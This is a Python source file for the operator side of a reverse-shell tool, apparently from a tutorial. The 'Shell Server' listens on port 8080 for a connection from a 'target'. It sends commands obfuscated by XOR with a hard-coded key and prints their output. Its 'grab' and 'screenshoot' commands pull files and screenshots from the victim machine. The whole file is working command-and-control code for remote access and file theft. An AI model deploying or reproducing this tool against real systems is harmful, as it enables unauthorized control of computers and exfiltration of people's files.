# TCP Server
from socket import socket, AF_INET, SOCK_STREAM

class Server:
    ''' Shell Server '''
    def __init__(self):
        self.IP = '<SERVER-IP-ADDRESS>'
        self.PORT = 8080
        self.key = 'E5c(;7=>-u%9Zd0IT!dbYJ3&(j~q=FBt.%;bh1<EH5|/-[;=HqsRNgM%|O,T{vX9->Nds8n4?H?I~S9kzzqOln4Xn%fQt4aI:0xJmG1#FG{20YHZ.-ZfeAGh&qH:]RtC^KUo#(aJ1[zFJErWRz}Vmw%~W^${X75t$P7jf(}ZtBD}D:IoXjv/_X|T|WjJhGpc0Y^2LGMj|w_xBHK3xFus5lwFHllS0XpUZtpo9^^<Ps%aGsL2L-dL[$[7x$j_%1jy!bj2P[Q:mhVwP_N}){x7Lc?G$qe4WN!}+9xSP{(}<e}14Z-i5Vm}^;UJ.LC]Q62.|n.&,P#!%PUWg,B!9H8LYK0KanpLk<s?!5{[y.C^WtX.ChDVrnTbYZ4ub5v-D}W]4#%A28YQbSQF.[LwUx>Iw!mK;cm1U$p-6>Ewrs?U)z[p8uAtYvH0%FuYz9<]bbc=teDUcgOaOc6g4Q,ry^4;oc3I0Z?:19](CLU/rJ{_8B2Th6mtz/J1_4,yiko3V0eqT2HANzyJ!0Ug&YET~%0qN_c~F=?W[mP-6r>&X9aqS#R-eS4mw_Y!>&L.uniEn!}7z.}[h8GiNtGj:>.0{R?]Nf7r[5+pfI?FcU0#^w$F~t]+:#Q~+4^wdMq96PE!d^R#k)V/w^i^.AZ&~S|63KS{4R)62$>8Yz2HmmV;6G&8h(S6Tf{PbAsjtieOX:Po%+Xr+b],p7lrBFpfKksX^LUV}ryx,-s5r6D]}25Tl5A-E4+WUKS=vp7l0:qnx88W:KrtAlY){^Bo.03,48ZAqST]2h6v{/Bh=V=vOi)71U9aX6hL</]0ioG0;)h}!#tzfmM?vV+_!c4uFeC;uNFNMAuQ;)>}luze!.It&]!n-zMoZ2z&=?aO=b>Xd[mBn+1w%Q>po_lCJ-+V;O9v_.gL}0gH:CT6|ZW/6u<:JIBZ!Cr53H!Eqc)BCeD;-}i}0+K{OTRS8e1ffy#Y8czMo9c;O/W7Kk(:i}UI5%>.0QIq,[Qv,&^McoP8KXwUm6TC}exdR8Ac'

    def str_xor(self, s1, s2):
        ''' Encrypt/Decrypt function '''
        return "".join([chr(ord(c1) ^ ord(c2)) for (c1,c2) in zip(s1,s2)])

    def transfer(self, conn, command):
        ''' receive transfer file '''
        conn.send(self.str_xor(command, self.key).encode())
        filename = command.split()[-1]
        if filename == command:
            filename = 'screen.jpg'
        f = open(filename, 'wb')
        while True: 
            bits = conn.recv(1024)
            if b'Unable to find out the file' in bits:
                print('[!] Unable to find out the file')
                break
            if bits == b'DONE':
                print('[*] Transfer completed ')
                f.close()
                break
            f.write(bits)

    def connect(self):
        ''' listen for client connection '''
        s = socket(AF_INET, SOCK_STREAM) 
        # define the server IP and the listening port
        s.bind((self.IP, self.PORT)) 
        # define the backlog size, since we are expecting a single connection from a single
        # target we will listen to one connection
        s.listen(1) 
        print(f'[*] Listening for incoming TCP connection on port {self.PORT}')
        # accept() function will return the connection object ID (conn) and will return the client(target) IP address and source
        # port in a tuple format (IP,port)
        conn, addr = s.accept() 
        print('[+] Connection Received: ', addr)

        while True:
            # Get user input and store it in command variable
            command = input("Shell> ") 
            
            if 'terminate' in command: 
                # If we got terminate command, inform the client and close the connect and break the loop
                conn.send(self.str_xor('terminate', self.key).encode())
                conn.close()
                break
            elif 'grab' in command or 'screenshoot' in command:    
                # if we received grab keyword from the user input, then this is an indicator for
                # file transfer operation, hence we will call transfer function
                self.transfer(conn, command)
            else:
                # Otherwise we will send the command to the target
                conn.send(self.str_xor(command, self.key).encode()) 
                # and print the result that we got back
                print(self.str_xor(conn.recv(1024).decode(), self.key)) 

def main():
    s = Server()
    s.connect()

if __name__ == "__main__":
    main()